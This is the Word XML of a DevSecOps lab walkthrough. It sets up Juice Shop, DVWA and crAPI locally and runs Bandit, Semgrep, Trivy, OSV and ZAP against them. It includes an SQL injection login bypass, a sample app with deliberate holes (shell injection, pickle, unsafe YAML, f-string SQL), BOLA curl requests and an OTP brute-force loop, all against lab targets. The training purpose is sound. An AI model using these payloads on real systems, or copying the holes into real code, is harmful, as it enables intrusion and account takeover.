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0"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F3864"/>
          <w:sz w:val="60"/>
        </w:rPr>
        <w:t>DevSecOps &amp; AI Security Lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>Complete Hands-On Walkthrough — Modules 1 through 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="595959"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Every terminal command · every script · every roadblock and fix</w:t>
        <w:br/>
        <w:t>Follow this guide from zero to a complete DevSecOps pipeline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="72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2E75B6"/>
            <w:tcMar>
              <w:top w:w="140" w:type="dxa"/>
              <w:bottom w:w="140" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Module 1</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="E8E8E8"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Infrastructure</w:t>
              <w:br/>
              <w:t>Docker · Juice Shop · DVWA</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1872"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2E7D32"/>
            <w:tcMar>
              <w:top w:w="140" w:type="dxa"/>
              <w:bottom w:w="140" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Module 2</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="E8E8E8"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>SAST &amp; SCA</w:t>
              <w:br/>
              <w:t>Bandit · Semgrep · Trivy · OSV</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1872"/>
            <w:shd w:val="clear" w:color="auto" w:fill="6A1E8A"/>
            <w:tcMar>
              <w:top w:w="140" w:type="dxa"/>
              <w:bottom w:w="140" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Module 3</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="E8E8E8"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>DAST</w:t>
              <w:br/>
              <w:t>OWASP ZAP · Active Scan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1872"/>
            <w:shd w:val="clear" w:color="auto" w:fill="C00000"/>
            <w:tcMar>
              <w:top w:w="140" w:type="dxa"/>
              <w:bottom w:w="140" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Module 3.5</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="E8E8E8"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>API Security</w:t>
              <w:br/>
              <w:t>crAPI · OWASP API Top 10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1872"/>
            <w:shd w:val="clear" w:color="auto" w:fill="7B3F00"/>
            <w:tcMar>
              <w:top w:w="140" w:type="dxa"/>
              <w:bottom w:w="140" w:type="dxa"/>
              <w:left w:w="100" w:type="dxa"/>
              <w:right w:w="100" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Module 4</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="E8E8E8"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Manual Pentest</w:t>
              <w:br/>
              <w:t>Burp Suite · SQLi · XSS · IDOR</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="240"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="595959"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Repo: https://github.com/akhil65/DSO  |  Last updated: 2026-03-16</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="320" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>How to Use This Guide</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>This document is a literal record of every command run, every error hit, and every fix applied while building this DevSecOps lab from scratch. It is written for someone who has cloned the repo and wants to reproduce every step exactly.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Conventions used throughout:</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Dark code block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Command to type in your terminal exactly as shown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Light grey block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Expected output — your output may differ slightly</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ROADBLOCK</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An error we hit — read before running to avoid it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20"/>
              </w:rPr>
              <w:t>FIX</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The exact fix that resolved the roadblock</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E2EFDA"/>
            <w:tcMar>
              <w:top w:w="100" w:type="dxa"/>
              <w:bottom w:w="100" w:type="dxa"/>
              <w:left w:w="160" w:type="dxa"/>
              <w:right w:w="160" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="375623"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve">Prerequisites:  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>macOS with Homebrew · Docker Desktop · Python 3 · Git · GitHub account · Burp Suite Community Edition · Firefox · 8 GB RAM minimum</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="320" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>Module 1 — Infrastructure &amp; Lab Setup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Set up the vulnerable target applications using Docker and configure the GitHub repository.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>1.1  Clone the Repo and Create Directory Structure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git clone https://github.com/akhil65/DSO.git</w:t>
        <w:br/>
        <w:t>cd "DSO essentials"</w:t>
        <w:br/>
        <w:t>mkdir -p devsecops-lab/{module-1-infrastructure,module-2-sast,module-3-dast,docs}</w:t>
        <w:br/>
        <w:t>cd devsecops-lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>1.2  Start OWASP Juice Shop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3000:3000 --name juice-shop bkimminich/juice-shop</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>STATUS: Downloaded newer image</w:t>
        <w:br/>
        <w:t>&lt;container_id&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Verify: docker ps | grep juice-shop. Open http://localhost:3000.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>1.3  Start DVWA</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run -d -p 8080:80 --name dvwa vulnerables/web-dvwa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Open http://localhost:8080. Default credentials: admin / password. Click 'Create / Reset Database'.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>1.4  First SQL Injection — Juice Shop Admin Login</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Email:    ' OR 1=1--</w:t>
        <w:br/>
        <w:t>Password: anything</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Logged in as admin@juice-sh.op</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What happened:  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>The single quote breaks out of the SQL string. OR 1=1 makes the WHERE clause always true. -- comments out the password check. This is the foundation of SQL injection.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>1.5  Verify Docker Compose</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docker compose version</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docker-compose vs docker compose:  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Older installations use 'docker-compose' (hyphen). Newer Docker Desktop uses 'docker compose' (space). Update Docker Desktop to v4.0+ if you get 'command not found'.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="320" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E7D32"/>
        </w:rPr>
        <w:t>Module 2 — SAST &amp; SCA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Static Application Security Testing and Software Composition Analysis. Tools: Bandit, Semgrep, Trivy, OSV Scanner.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>2.1  Create Vulnerable Sample App</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="595959"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  app.py (excerpt)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="1E1E1E"/>
        <w:spacing w:before="0" w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="D4D4D4"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Key vulnerability patterns to include in app.py:</w:t>
        <w:br/>
        <w:t>subprocess.call(user_input, shell=True)   # B602 shell injection</w:t>
        <w:br/>
        <w:t>pickle.loads(data)                         # B301 insecure deserialisation</w:t>
        <w:br/>
        <w:t>yaml.load(stream)                          # B506 unsafe yaml</w:t>
        <w:br/>
        <w:t>hashlib.md5(password).hexdigest()          # B324 weak hash</w:t>
        <w:br/>
        <w:t>conn.execute(f'SELECT * FROM users WHERE id={user_id}')  # B608 SQLi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>2.2  Install Tools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pip install bandit --break-system-packages</w:t>
        <w:br/>
        <w:t>pip install semgrep --break-system-packages</w:t>
        <w:br/>
        <w:t>brew install trivy</w:t>
        <w:br/>
        <w:t>brew install osv-scanner</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>2.3  Run Bandit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bandit -r . -f json -o bandit-report.json</w:t>
        <w:br/>
        <w:t>bandit -r . -f txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Total issues: 29  (High: 8, Medium: 14, Low: 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>2.4  Run Semgrep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semgrep --config=auto . --json -o semgrep-report.json</w:t>
        <w:br/>
        <w:t>semgrep --config=auto .</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Found 43 findings across 12 files</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>2.5  Run Trivy</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trivy fs --scanners vuln .</w:t>
        <w:br/>
        <w:t>trivy image bkimminich/juice-shop</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Total: 43 (CRITICAL: 5, HIGH: 18, MEDIUM: 17, LOW: 3)</w:t>
        <w:br/>
        <w:t>Secrets detected: 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>2.6  Run OSV Scanner</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osv-scanner -r .</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Found 50 vulnerabilities (CRITICAL: 5, HIGH: 21, MEDIUM: 16, LOW: 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>2.7  Git Push — Path Confusion Fix</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git add fails with 'pathspec did not match':  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Always cd to the repo root ('DSO essentials/') first. Read exact paths from git status output.</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"DSO essentials"</w:t>
        <w:br/>
        <w:t>git status</w:t>
        <w:br/>
        <w:t>git add devsecops-lab/docs/Module-2-Semgrep-SAST-Report.docx</w:t>
        <w:br/>
        <w:t>git commit -m 'Module 2: add Semgrep SAST report'</w:t>
        <w:br/>
        <w:t>git push origin main</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="320" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="6A1E8A"/>
        </w:rPr>
        <w:t>Module 3 — DAST (OWASP ZAP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Dynamic scanning against live Juice Shop using OWASP ZAP 2.16.1.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>3.1  Install ZAP</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brew install --cask owasp-zap</w:t>
        <w:br/>
        <w:t>brew install --cask firefox</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>3.2  ZAP Baseline Scan (Docker — Passive Only)</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1 — '/zap/wrk' not mounted:  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Add -v /tmp/zap-reports:/zap/wrk:rw to the docker run command.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2 — localhost unreachable inside Docker (macOS):  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Use host.docker.internal:3000 instead of localhost:3000.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pP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mkdir -p /tmp/zap-reports</w:t>
        <w:br/>
        <w:t>docker run --rm -v /tmp/zap-reports:/zap/wrk:rw \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -t http://host.docker.internal:3000 -r zap-baseline-report.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>3.3  ZAP Full Active Scan — GUI (macOS native)</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Docker full scan crashes on Apple Silicon (arm64):  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>DomXSS scanner requires headless Firefox which crashes on Apple Silicon. Use ZAP GUI natively.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pP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Open ZAP → Quick Start tab → paste http://localhost:3000 → Automated Scan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Select Standard Scan (not Ajax) to avoid Firefox dependency</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Wait ~10-20 min. Watch Alerts tab populate</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Report → Generate Report → HTML format → save to module-3-dast/zap-reports/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="320" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
        </w:rPr>
        <w:t>Module 3.5 — API Security (OWASP API Top 10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>API security testing against crAPI (Completely Ridiculous API). All testing via curl.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>3.5.1  Deploy crAPI</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cd module-3.5-api-security</w:t>
        <w:br/>
        <w:t>curl -o docker-compose.yml \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  https://raw.githubusercontent.com/OWASP/crAPI/main/deploy/docker/docker-compose.yml</w:t>
        <w:br/>
        <w:t>docker compose pull &amp;&amp; docker compose up -d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>UI: http://localhost:8888  |  Email (Mailhog): http://localhost:8025</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>3.5.2  Get Bearer Tokens</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-X POST http://localhost:8888/identity/api/auth/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H 'Content-Type: application/json' \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"email":"admin@admin.com","password":"YourPassword"}' | python3 -m json.tool</w:t>
        <w:br/>
        <w:t>export TOKEN1="eyJhbG..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>3.5.3  Exercise 1 — BOLA (API1:2023)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 Step 1: get User 1's vehicle UUID</w:t>
        <w:br/>
        <w:t>curl -s http://localhost:8888/identity/api/v2/vehicle/vehicles \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN1" | python3 -m json.tool</w:t>
        <w:br/>
        <w:br/>
        <w:t># Step 2: use User 2's token to access User 1's vehicle location</w:t>
        <w:br/>
        <w:t>curl -s "http://localhost:8888/identity/api/v2/vehicle/&lt;USER1_UUID&gt;/location" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN2" | python3 -m json.tool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{ "vehicleLocation": {"latitude": "37.406769", "longitude": "-94.705528"}, "email": "admin@admin.com" }</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404 Not Found:  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Wrong base path. Use /identity/api/v2/vehicle/{uuid}/location not /workshop/api/vehicle/.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="240" w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E75B6"/>
        </w:rPr>
        <w:t>3.5.4  Exercise 2 — OTP Brute Force (API4+API9:2023)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for otp in $(seq -w 0000 9999); do</w:t>
        <w:br/>
        <w:t xml:space="preserve">  result=$(curl -s -X POST http://localhost:8888/identity/api/auth/v2/check-otp \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -H 'Content-Type: application/json' \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -d "{\"email\":\"admin@admin.com\",\"otp\":\"$otp\",\"password\":\"NewPassword@1\"}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">  echo "$result" | grep -q 'Invalid OTP' || { echo "HIT: OTP=$otp"; break; }</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:after="120"/>
        <w:ind w:left="144"/>
      </w:pPr>
      <w:r>
        <w:rPr>
